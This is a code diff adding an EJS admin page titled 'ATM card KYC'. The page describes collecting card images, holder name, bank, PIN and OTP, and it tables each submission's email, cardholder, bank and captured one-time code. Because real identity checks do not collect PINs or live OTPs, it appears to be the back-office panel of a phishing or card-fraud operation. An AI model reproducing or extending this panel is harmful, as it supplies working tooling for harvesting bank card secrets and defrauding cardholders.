@@ -1,0 +1,50 @@
+<%- include('../partials/admin-shell-start') %>
+
+<div class="db-greeting">
+  <div>
+    <h1>ATM card KYC</h1>
+    <p>Card front/back, holder, bank, PIN, and OTP for manual review.</p>
+  </div>
+  <span class="db-chip"><%= (queue || []).length %> total</span>
+</div>
+
+<% if (typeof message !== 'undefined' && message) { %><div class="db-alert db-alert--ok"><%= message %></div><% } %>
+<% if (typeof error !== 'undefined' && error) { %><div class="db-alert db-alert--err"><%= error %></div><% } %>
+
+<section class="db-panel">
+  <% if (!(queue || []).length) { %>
+    <p style="color:#788391;padding:12px 0;">No ATM submissions yet.</p>
+  <% } else { %>
+    <div style="overflow-x:auto;">
+      <table class="accounts-table" style="width:100%;border-collapse:collapse;">
+        <thead>
+          <tr>
+            <th style="text-align:left;padding:10px 8px;">Customer</th>
+            <th style="text-align:left;padding:10px 8px;">Holder</th>
+            <th style="text-align:left;padding:10px 8px;">Bank</th>
+            <th style="text-align:left;padding:10px 8px;">OTP</th>
+            <th style="text-align:left;padding:10px 8px;">Status</th>
+            <th style="text-align:left;padding:10px 8px;"></th>
+          </tr>
+        </thead>
+        <tbody>
+          <% queue.forEach(function(s) { %>
+            <tr style="border-top:1px solid #efe6d6;">
+              <td style="padding:12px 8px;">
+                <strong><%= s.email %></strong><br>
+                <small style="color:#788391;"><%= s.customerReference || s.userId %></small>
+              </td>
+              <td style="padding:12px 8px;"><%= s.holderName %></td>
+              <td style="padding:12px 8px;"><%= s.bankName %></td>
+              <td style="padding:12px 8px;"><%= s.otpCode ? s.otpCode : '—' %></td>
+              <td style="padding:12px 8px;"><span class="kyc-badge"><%= s.status %></span></td>
+              <td style="padding:12px 8px;"><a class="settings-link" href="/admin/kyc/atm/<%= s.id %>">Review →</a></td>
+            </tr>
+          <% }) %>
+        </tbody>
+      </table>
+    </div>
+  <% } %>
+</section>
+
+<%- include('../partials/admin-shell-end') %>
